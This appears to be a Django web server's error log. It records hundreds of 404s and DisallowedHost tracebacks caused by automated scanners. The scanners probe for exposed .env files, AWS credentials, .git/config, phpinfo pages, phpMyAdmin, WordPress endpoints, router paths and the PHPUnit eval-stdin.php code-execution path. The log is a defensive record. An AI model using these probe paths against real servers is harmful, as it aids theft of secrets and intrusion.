Not Found: /dev/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /develop/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /ec/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /ecc/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /git/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /lab/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /laravel_api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /laravel_web/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /live/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /local/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /modules/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /new/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /old/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /panel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /pid/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /pkm/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /pms/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /portal/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /pos/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /pos/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /production/api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /production/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /public/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /server/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /site/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /workspace/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /web/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /robots.txt
Not Found: /news/imran-suspects-a-plot-behind-constitutional-court-proposal/contact.html
Not Found: /robots.txt
Not Found: /wp-includes/wlwmanifest.xml
Not Found: /xmlrpc.php
Not Found: /blog/wp-includes/wlwmanifest.xml
Not Found: /web/wp-includes/wlwmanifest.xml
Not Found: /wordpress/wp-includes/wlwmanifest.xml
Not Found: /website/wp-includes/wlwmanifest.xml
Not Found: /wp/wp-includes/wlwmanifest.xml
Not Found: /news/wp-includes/wlwmanifest.xml
Not Found: /2018/wp-includes/wlwmanifest.xml
Not Found: /2019/wp-includes/wlwmanifest.xml
Not Found: /shop/wp-includes/wlwmanifest.xml
Not Found: /wp1/wp-includes/wlwmanifest.xml
Not Found: /test/wp-includes/wlwmanifest.xml
Not Found: /wp2/wp-includes/wlwmanifest.xml
Not Found: /site/wp-includes/wlwmanifest.xml
Not Found: /cms/wp-includes/wlwmanifest.xml
Not Found: /sito/wp-includes/wlwmanifest.xml
Not Found: /actuator/gateway/routes
Not Found: /form.html
Not Found: /upl.php
Not Found: /t4
Not Found: /geoip/
Not Found: /1.php
Not Found: /systembc/password.php
Not Found: /password.php
Not Found: /libs/js/iframe.js
Not Found: /robots.txt
Not Found: /index.html
Not Found: /contact.html
Not Found: /index.html
Not Found: /contact.html
Not Found: /index.html
Not Found: /contact.html
Not Found: /_profiler/phpinfo
Not Found: /phpinfo.php
Not Found: /phpinfo
Not Found: /info.php
Not Found: /php-info.php
Not Found: /phpinfoposmeta.php
Not Found: /dashboard/phpinfo.php
Not Found: /ppinfo.php
Not Found: /contact.html
Not Found: /cgi-bin/luci/;stok=/locale
Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Traceback (most recent call last):
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
    response = get_response(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/utils/deprecation.py", line 133, in __call__
    response = self.process_request(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/middleware/common.py", line 48, in process_request
    host = request.get_host()
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/http/request.py", line 151, in get_host
    raise DisallowedHost(msg)
django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Bad Request: /
Not Found: /robots.txt
Not Found: /index.html
Not Found: /.env
Not Found: /sitemap.txt
Not Found: /cgi-bin/luci/;stok=/locale
Not Found: /.env
Not Found: /sitemap.txt
Not Found: /.git/config
Not Found: /cgi-bin/luci/;stok=/locale
Not Found: /cgi-bin/luci/;stok=/locale
Not Found: /.env
Not Found: /.env_example
Not Found: /core/.env
Not Found: /app/.env
Not Found: /laravel/.env
Not Found: /web/.env
Not Found: /crm/.env
Not Found: /backend/.env
Not Found: /local/.env
Not Found: /api/.env
Not Found: /application/.env
Not Found: /env.bak
Not Found: /phpinfo
Not Found: /_profiler/phpinfo
Not Found: /phpinfo.php
Not Found: /.env.bak
Not Found: /.env.backup
Not Found: /.env_sample
Not Found: /.env.old
Not Found: /.env.www
Not Found: /.docker/.env
Not Found: /.env.dev
Not Found: /.env.example
Not Found: /config.env
Not Found: /.environment
Not Found: /.env.production
Not Found: /.env.production.local
Not Found: /.env.prod
Not Found: /.env.test
Not Found: /.env.php
Not Found: /config/settings.ini
Not Found: /info
Not Found: /info.php
Not Found: /linusadmin-phpinfo.php
Not Found: /portal/.env
Not Found: /env/.env
Not Found: /dev/.env
Not Found: /new/.env
Not Found: /new/.env.local
Not Found: /new/.env.production
Not Found: /new/.env.staging
Not Found: /_phpinfo.php
Not Found: /_profiler/phpinfo/info.php
Not Found: /_profiler/phpinfo/phpinfo.php
Not Found: /wp-config
Not Found: /aws-secret.yaml
Not Found: /awstats/.env
Not Found: /conf/.env
Not Found: /cron/.env
Not Found: /www/.env
Not Found: /docker/.env
Not Found: /docker/app/.env
Not Found: /env.backup
Not Found: /xampp/phpinfo.php
Not Found: /lara/info.php
Not Found: /lara/phpinfo.php
Not Found: /laravel/info.php
Not Found: /.vscode/.env
Not Found: /js/.env
Not Found: /laravel/core/.env
Not Found: /mail/.env
Not Found: /mailer/.env
Not Found: /nginx/.env
Not Found: /public/.env
Not Found: /site/.env
Not Found: /.env
Not Found: /.env_example
Not Found: /core/.env
Not Found: /app/.env
Not Found: /laravel/.env
Not Found: /web/.env
Not Found: /crm/.env
Not Found: /backend/.env
Not Found: /local/.env
Not Found: /api/.env
Not Found: /application/.env
Not Found: /env.bak
Not Found: /phpinfo
Not Found: /_profiler/phpinfo
Not Found: /phpinfo.php
Not Found: /.env.bak
Not Found: /.env.backup
Not Found: /.env_sample
Not Found: /.env.old
Not Found: /.env.www
Not Found: /.docker/.env
Not Found: /.env.dev
Not Found: /.env.example
Not Found: /config.env
Not Found: /.environment
Not Found: /.env.production
Not Found: /.env.production.local
Not Found: /.env.prod
Not Found: /.env.test
Not Found: /.env.php
Not Found: /config/settings.ini
Not Found: /info
Not Found: /info.php
Not Found: /linusadmin-phpinfo.php
Not Found: /portal/.env
Not Found: /env/.env
Not Found: /dev/.env
Not Found: /new/.env
Not Found: /new/.env.local
Not Found: /new/.env.production
Not Found: /new/.env.staging
Not Found: /_phpinfo.php
Not Found: /_profiler/phpinfo/info.php
Not Found: /_profiler/phpinfo/phpinfo.php
Not Found: /wp-config
Not Found: /aws-secret.yaml
Not Found: /awstats/.env
Not Found: /conf/.env
Not Found: /cron/.env
Not Found: /www/.env
Not Found: /docker/.env
Not Found: /docker/app/.env
Not Found: /env.backup
Not Found: /xampp/phpinfo.php
Not Found: /lara/info.php
Not Found: /lara/phpinfo.php
Not Found: /laravel/info.php
Not Found: /.vscode/.env
Not Found: /js/.env
Not Found: /laravel/core/.env
Not Found: /mail/.env
Not Found: /mailer/.env
Not Found: /nginx/.env
Not Found: /public/.env
Not Found: /site/.env
Not Found: /xampp/.env
Not Found: /.docker/laravel/app/.env
Not Found: /laravel/.env.local
Not Found: /laravel/.env.production
Not Found: /laravel/.env.staging
Not Found: /laravel/core/.env.local
Not Found: /laravel/core/.env.production
Not Found: /laravel/core/.env.staging
Not Found: /main/.env
Not Found: /node_modules/.env
Not Found: /php.ini
Not Found: /.aws/credentials
Not Found: /config.json
Not Found: /config.php
Not Found: /server/config.json
Not Found: /.aws/config
Not Found: /config.ini
Not Found: /settings.php
Not Found: /docker_run.sh
Not Found: /secrets.json
Not Found: /awsconfig.js
Not Found: /startup.sh
Not Found: /config.inc.php
Not Found: /.travis.yml
Not Found: /parameters.yml
Not Found: /sendgrid.json
Not Found: /config/appsettings.json
Not Found: /bootstrap/cache/config.php
Not Found: /storage/app/private/.env
Not Found: /storage/logs/laravel.log
Not Found: /config/services.php
Not Found: /composer.lock
Not Found: /public/_debugbar/
Not Found: /contact.html
Not Found: /Blogs/index.html
Not Found: /news/Govt-unsuccessful-in-winning-over-Fazl/contact.html
Not Found: /news/the-us-fed-cut-interest-rates-by-more-than-expected-so-what/contact.html
Not Found: /youtube-video-downloader/contact.html/
Not Found: /news/imran-suspects-a-plot-behind-constitutional-court-proposal/index.html
Not Found: /Blogs/contact.html
Not Found: /robots.txt
Not Found: /cgi-bin/luci/;stok=/locale
Not Found: /robots.txt
Not Found: /wp-login.php
Not Found: /wp-includes/wlwmanifest.xml
Not Found: /xmlrpc.php
Not Found: /blog/wp-includes/wlwmanifest.xml
Not Found: /web/wp-includes/wlwmanifest.xml
Not Found: /wordpress/wp-includes/wlwmanifest.xml
Not Found: /website/wp-includes/wlwmanifest.xml
Not Found: /wp/wp-includes/wlwmanifest.xml
Not Found: /news/wp-includes/wlwmanifest.xml
Not Found: /2020/wp-includes/wlwmanifest.xml
Not Found: /2019/wp-includes/wlwmanifest.xml
Not Found: /shop/wp-includes/wlwmanifest.xml
Not Found: /wp1/wp-includes/wlwmanifest.xml
Not Found: /test/wp-includes/wlwmanifest.xml
Not Found: /wp2/wp-includes/wlwmanifest.xml
Not Found: /site/wp-includes/wlwmanifest.xml
Not Found: /cms/wp-includes/wlwmanifest.xml
Not Found: /sito/wp-includes/wlwmanifest.xml
Not Found: /cgi-bin/luci/;stok=/locale
Not Found: /wp-includes/wlwmanifest.xml
Not Found: /xmlrpc.php
Not Found: /blog/wp-includes/wlwmanifest.xml
Not Found: /web/wp-includes/wlwmanifest.xml
Not Found: /wordpress/wp-includes/wlwmanifest.xml
Not Found: /website/wp-includes/wlwmanifest.xml
Not Found: /wp/wp-includes/wlwmanifest.xml
Not Found: /news/wp-includes/wlwmanifest.xml
Not Found: /2018/wp-includes/wlwmanifest.xml
Not Found: /2019/wp-includes/wlwmanifest.xml
Not Found: /shop/wp-includes/wlwmanifest.xml
Not Found: /wp1/wp-includes/wlwmanifest.xml
Not Found: /test/wp-includes/wlwmanifest.xml
Not Found: /wp2/wp-includes/wlwmanifest.xml
Not Found: /site/wp-includes/wlwmanifest.xml
Not Found: /cms/wp-includes/wlwmanifest.xml
Not Found: /sito/wp-includes/wlwmanifest.xml
Not Found: /robots.txt
Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Traceback (most recent call last):
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
    response = get_response(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/utils/deprecation.py", line 133, in __call__
    response = self.process_request(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/middleware/common.py", line 48, in process_request
    host = request.get_host()
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/http/request.py", line 151, in get_host
    raise DisallowedHost(msg)
django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Bad Request: /
Not Found: /form.html
Not Found: /upl.php
Not Found: /t4
Not Found: /geoip/
Not Found: /1.php
Not Found: /systembc/password.php
Not Found: /password.php
Not Found: /.env.dist
Not Found: /robots.txt
Not Found: /contact.html
Not Found: /contact/contact.html
Not Found: /Blogs/contact.html
Not Found: /wp-includes/wlwmanifest.xml
Not Found: /xmlrpc.php
Not Found: /blog/wp-includes/wlwmanifest.xml
Not Found: /web/wp-includes/wlwmanifest.xml
Not Found: /wordpress/wp-includes/wlwmanifest.xml
Not Found: /website/wp-includes/wlwmanifest.xml
Not Found: /wp/wp-includes/wlwmanifest.xml
Not Found: /news/wp-includes/wlwmanifest.xml
Not Found: /2018/wp-includes/wlwmanifest.xml
Not Found: /2019/wp-includes/wlwmanifest.xml
Not Found: /shop/wp-includes/wlwmanifest.xml
Not Found: /wp1/wp-includes/wlwmanifest.xml
Not Found: /test/wp-includes/wlwmanifest.xml
Not Found: /wp2/wp-includes/wlwmanifest.xml
Not Found: /site/wp-includes/wlwmanifest.xml
Not Found: /cms/wp-includes/wlwmanifest.xml
Not Found: /sito/wp-includes/wlwmanifest.xml
Not Found: /index.php
Not Found: /index.php
Not Found: /index.php
Not Found: /index.php
Not Found: /public/index.php
Not Found: /cgi-bin/luci/;stok=/locale
Not Found: /druid/index.html
Not Found: /cgi-bin/luci/;stok=/locale
Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Traceback (most recent call last):
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
    response = get_response(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/utils/deprecation.py", line 133, in __call__
    response = self.process_request(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/middleware/common.py", line 48, in process_request
    host = request.get_host()
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/http/request.py", line 151, in get_host
    raise DisallowedHost(msg)
django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Bad Request: /
Not Found: /manager/
Not Found: /simpla/
Not Found: /js/mage/cookies.js
Not Found: /administrator/
Not Found: /robots.txt
Not Found: /manager/
Not Found: /simpla/
Not Found: /js/mage/cookies.js
Not Found: /administrator/
Not Found: /cgi-bin/luci/;stok=/locale
Not Found: /wordpress
Not Found: /wp-admin/setup-config.php
Not Found: /wp-admin/install.php
Not Found: /wp
Not Found: /blog
Not Found: /new
Not Found: /old
Not Found: /newsite
Not Found: /test
Not Found: /main
Not Found: /main
Not Found: /testing
Not Found: /site
Not Found: /backup
Not Found: /demo
Not Found: /home
Not Found: /tmp
Not Found: /dev
Not Found: /cms
Not Found: /portal
Not Found: /web
Not Found: /wp-admin/css/
Not Found: /.well-known/
Not Found: /sites/default/files/
Not Found: /uploads/
Not Found: /images/
Not Found: /files/
Not Found: /config/.git/config
Not Found: /app/dev/.git/config
Not Found: /test/.git/config
Not Found: /data/.git/config
Not Found: /media../.git/config
Not Found: /sandbox/.git/config
Not Found: /robots.txt
Not Found: /.env
Not Found: /wp-content/
Not Found: /.git/config
Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Traceback (most recent call last):
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
    response = get_response(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/utils/deprecation.py", line 133, in __call__
    response = self.process_request(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/middleware/common.py", line 48, in process_request
    host = request.get_host()
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/http/request.py", line 151, in get_host
    raise DisallowedHost(msg)
django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Bad Request: /
Invalid HTTP_HOST header: '103.147.86.158:x'. The domain name provided is not valid according to RFC 1034/1035.
Traceback (most recent call last):
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
    response = get_response(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/utils/deprecation.py", line 133, in __call__
    response = self.process_request(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/middleware/common.py", line 48, in process_request
    host = request.get_host()
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/http/request.py", line 151, in get_host
    raise DisallowedHost(msg)
django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: '103.147.86.158:x'. The domain name provided is not valid according to RFC 1034/1035.
Bad Request: /
Not Found: /wp-admin/css/
Not Found: /.well-known/
Not Found: /sites/default/files/
Not Found: /uploads/
Not Found: /images/
Not Found: /files/
Not Found: /cgi-bin/luci/;stok=/locale
Not Found: /libs/js/iframe.js
Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Traceback (most recent call last):
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
    response = get_response(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/utils/deprecation.py", line 133, in __call__
    response = self.process_request(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/middleware/common.py", line 48, in process_request
    host = request.get_host()
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/http/request.py", line 151, in get_host
    raise DisallowedHost(msg)
django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Bad Request: /
Not Found: /.env
Not Found: /phpmyadmin/index.php
Not Found: /pmd/index.php
Not Found: /phpmyadmin4.8.5/index.php
Not Found: /manager/text/list
Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Traceback (most recent call last):
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
    response = get_response(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/utils/deprecation.py", line 133, in __call__
    response = self.process_request(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/middleware/common.py", line 48, in process_request
    host = request.get_host()
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/http/request.py", line 151, in get_host
    raise DisallowedHost(msg)
django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Bad Request: /boaform/admin/formLogin
Not Found: /cgi-bin/luci/;stok=/locale
Not Found: /shell
Not Found: /cgi-bin/luci/;stok=/locale
Not Found: /wp-includes/wlwmanifest.xml
Not Found: /xmlrpc.php
Not Found: /blog/wp-includes/wlwmanifest.xml
Not Found: /web/wp-includes/wlwmanifest.xml
Not Found: /wordpress/wp-includes/wlwmanifest.xml
Not Found: /website/wp-includes/wlwmanifest.xml
Not Found: /wp/wp-includes/wlwmanifest.xml
Not Found: /news/wp-includes/wlwmanifest.xml
Not Found: /2018/wp-includes/wlwmanifest.xml
Not Found: /2019/wp-includes/wlwmanifest.xml
Not Found: /shop/wp-includes/wlwmanifest.xml
Not Found: /wp1/wp-includes/wlwmanifest.xml
Not Found: /test/wp-includes/wlwmanifest.xml
Not Found: /wp2/wp-includes/wlwmanifest.xml
Not Found: /site/wp-includes/wlwmanifest.xml
Not Found: /cms/wp-includes/wlwmanifest.xml
Not Found: /sito/wp-includes/wlwmanifest.xml
Not Found: /form.html
Not Found: /upl.php
Not Found: /t4
Not Found: /geoip/
Not Found: /1.php
Not Found: /systembc/password.php
Not Found: /password.php
Not Found: /cgi-bin/luci/;stok=/locale
Not Found: /hudson
Not Found: /robots.txt
Not Found: /.env
Not Found: /cgi-bin/luci/;stok=/locale
Not Found: /.env
Not Found: /actuator/gateway/routes
Not Found: /webui/
Not Found: /geoserver/web/
Not Found: /phpmyadmin/index.php
Not Found: /.env
Forbidden (CSRF cookie not set.): /
Not Found: /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /vendor/phpunit/phpunit/Util/PHP/eval-stdin.php
Not Found: /vendor/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /vendor/phpunit/Util/PHP/eval-stdin.php
Not Found: /vendor/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /vendor/phpunit/phpunit/LICENSE/eval-stdin.php
Not Found: /api/bin/123123
Not Found: /robots.txt
Not Found: /cgi-bin/luci/;stok=/locale
Not Found: /.env
Not Found: /xmlrpc.php
Not Found: /contact.html
Not Found: /.env
Not Found: /api/balance
Not Found: /robots.txt
Not Found: /phpmyadmin/index.php
Not Found: /wp-includes/wlwmanifest.xml
Not Found: /xmlrpc.php
Not Found: /blog/wp-includes/wlwmanifest.xml
Not Found: /web/wp-includes/wlwmanifest.xml
Not Found: /wordpress/wp-includes/wlwmanifest.xml
Not Found: /website/wp-includes/wlwmanifest.xml
Not Found: /wp/wp-includes/wlwmanifest.xml
Not Found: /news/wp-includes/wlwmanifest.xml
Not Found: /2018/wp-includes/wlwmanifest.xml
Not Found: /2019/wp-includes/wlwmanifest.xml
Not Found: /shop/wp-includes/wlwmanifest.xml
Not Found: /wp1/wp-includes/wlwmanifest.xml
Not Found: /test/wp-includes/wlwmanifest.xml
Not Found: /wp2/wp-includes/wlwmanifest.xml
Not Found: /site/wp-includes/wlwmanifest.xml
Not Found: /cms/wp-includes/wlwmanifest.xml
Not Found: /sito/wp-includes/wlwmanifest.xml
Not Found: /.env
Not Found: /docker-compose.prod.yml
Not Found: /files/.git/config
Not Found: /dev/.git/config
Not Found: /.env.default
Not Found: /.env.staging.local
Not Found: /.env.ci
Not Found: /.env.prod
Not Found: /configuration/.env
Not Found: /assets../.git/config
Not Found: /.env.sandbox
Not Found: /.env.production.local
Not Found: /.env.secret
Not Found: /api/.env
Not Found: /static../.git/config
Not Found: /.env.backup
Not Found: /.env.development.local
Not Found: /.env.stage
Not Found: /cgi-bin/luci/;stok=/locale
Not Found: /.git/config
Not Found: /.env
Not Found: /phpmyadmin/index.php
Not Found: /cgi-bin/luci/;stok=/locale
Not Found: /phpmyadmin/index.php
Not Found: /.git/config
Not Found: /cgi-bin/luci/;stok=/locale
Not Found: /phpmyadmin/index.php
Not Found: /pmd/index.php
Not Found: /phpmyadmin4.8.5/index.php
Not Found: /form.html
Not Found: /upl.php
Not Found: /t4
Not Found: /geoip/
Not Found: /1.php
Not Found: /systembc/password.php
Not Found: /password.php
Not Found: /phpmyadmin/index.php
Not Found: /sftp-config.json
Not Found: /ftp-config.json
Not Found: /config.json
Not Found: /.vscode/sftp.json
Not Found: /sftp.json
Not Found: /.vscode/ftp.json
Not Found: /ftp.json
Not Found: /.vscode/ftp-config.json
Not Found: /.vscode/sftp-config.json/vendor/.vscode/ftp.json
Not Found: /vendor/.vscode/sftp.json
Not Found: /vendor/.vscode/sftp-config.json
Not Found: /libs/js/iframe.js
Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Traceback (most recent call last):
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
    response = get_response(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/utils/deprecation.py", line 133, in __call__
    response = self.process_request(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/middleware/common.py", line 48, in process_request
    host = request.get_host()
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/http/request.py", line 151, in get_host
    raise DisallowedHost(msg)
django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Bad Request: /
Not Found: /api/bin/123123
Not Found: /.env
Not Found: /cgi-bin/luci/;stok=/locale
Not Found: /cgi-bin/luci/;stok=/locale
Invalid HTTP_HOST header: 'azenv.net'. You may need to add 'azenv.net' to ALLOWED_HOSTS.
Traceback (most recent call last):
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
    response = get_response(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/utils/deprecation.py", line 133, in __call__
    response = self.process_request(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/middleware/common.py", line 48, in process_request
    host = request.get_host()
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/http/request.py", line 151, in get_host
    raise DisallowedHost(msg)
django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: 'azenv.net'. You may need to add 'azenv.net' to ALLOWED_HOSTS.
Bad Request: /
Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Traceback (most recent call last):
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
    response = get_response(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/utils/deprecation.py", line 133, in __call__
    response = self.process_request(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/middleware/common.py", line 48, in process_request
    host = request.get_host()
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/http/request.py", line 151, in get_host
    raise DisallowedHost(msg)
django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Bad Request: /boaform/admin/formLogin
Not Found: /wp-includes/wlwmanifest.xml
Not Found: /xmlrpc.php
Not Found: /blog/wp-includes/wlwmanifest.xml
Not Found: /web/wp-includes/wlwmanifest.xml
Not Found: /wordpress/wp-includes/wlwmanifest.xml
Not Found: /website/wp-includes/wlwmanifest.xml
Not Found: /wp/wp-includes/wlwmanifest.xml
Not Found: /news/wp-includes/wlwmanifest.xml
Not Found: /2018/wp-includes/wlwmanifest.xml
Not Found: /2019/wp-includes/wlwmanifest.xml
Not Found: /shop/wp-includes/wlwmanifest.xml
Not Found: /wp1/wp-includes/wlwmanifest.xml
Not Found: /test/wp-includes/wlwmanifest.xml
Not Found: /wp2/wp-includes/wlwmanifest.xml
Not Found: /site/wp-includes/wlwmanifest.xml
Not Found: /cms/wp-includes/wlwmanifest.xml
Not Found: /sito/wp-includes/wlwmanifest.xml
Not Found: /robots.txt
Not Found: /.git/config
Not Found: /wp-includes/wlwmanifest.xml
Not Found: /xmlrpc.php
Not Found: /blog/wp-includes/wlwmanifest.xml
Not Found: /web/wp-includes/wlwmanifest.xml
Not Found: /wordpress/wp-includes/wlwmanifest.xml
Not Found: /website/wp-includes/wlwmanifest.xml
Not Found: /wp/wp-includes/wlwmanifest.xml
Not Found: /news/wp-includes/wlwmanifest.xml
Not Found: /2018/wp-includes/wlwmanifest.xml
Not Found: /2019/wp-includes/wlwmanifest.xml
Not Found: /shop/wp-includes/wlwmanifest.xml
Not Found: /wp1/wp-includes/wlwmanifest.xml
Not Found: /test/wp-includes/wlwmanifest.xml
Not Found: /wp2/wp-includes/wlwmanifest.xml
Not Found: /site/wp-includes/wlwmanifest.xml
Not Found: /cms/wp-includes/wlwmanifest.xml
Not Found: /sito/wp-includes/wlwmanifest.xml
Not Found: /.git/config
Not Found: /.env
Not Found: /.ENV
Not Found: /.Env
Not Found: /.AWS/credentials
Not Found: /.AWS/CREDENTIALS
Not Found: /.Aws/credentials
Not Found: /.CONFIG.yaml
Not Found: /.Config.yaml
Not Found: /.env.BAK
Not Found: /.ENV.example
Not Found: /.env.EXAMPLE
Not Found: /wp-includes/ID3/license.txt
Not Found: /feed/
Not Found: /xmlrpc.php
Not Found: /blog/wp-includes/wlwmanifest.xml
Not Found: /.ENV.EXAMPLE
Not Found: /web/wp-includes/wlwmanifest.xml
Not Found: /wordpress/wp-includes/wlwmanifest.xml
Not Found: /wp/wp-includes/wlwmanifest.xml
Not Found: /2020/wp-includes/wlwmanifest.xml
Not Found: /2019/wp-includes/wlwmanifest.xml
Not Found: /2021/wp-includes/wlwmanifest.xml
Not Found: /shop/wp-includes/wlwmanifest.xml
Not Found: /wp1/wp-includes/wlwmanifest.xml
Not Found: /test/wp-includes/wlwmanifest.xml
Not Found: /site/wp-includes/wlwmanifest.xml
Not Found: /cms/wp-includes/wlwmanifest.xml
Not Found: /ADMIN/.env
Not Found: /Admin/.env
Not Found: /Application/.env
Not Found: /APPLICATION/.env
Not Found: /BACKEND/.env
Not Found: /Config/.env
Not Found: /CONFIG/.env
Not Found: /Core/.env
Not Found: /CORE/.env
Not Found: /Cp/.env
Not Found: /CP/.env
Not Found: /Credentials
Not Found: /CREDENTIALS
Not Found: /Crm/.env
Not Found: /CRM/.env
Not Found: /Data/.env
Not Found: /cgi-bin/luci/;stok=/locale
Not Found: /DATA/.env
Not Found: /assets/plugins/jquery.filer/php/readme.txt
Not Found: /assets/vendor/jquery.filer/php/readme.txt
Not Found: /plugins/jquery.filer/php/readme.txt
Not Found: /assets/admin/bower_components/jquery.filer/php/readme.txt
Not Found: /jquery.filer/php/readme.txt
Not Found: /robots.txt
Not Found: /cgi-bin/luci/;stok=/locale
Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Traceback (most recent call last):
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
    response = get_response(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/utils/deprecation.py", line 133, in __call__
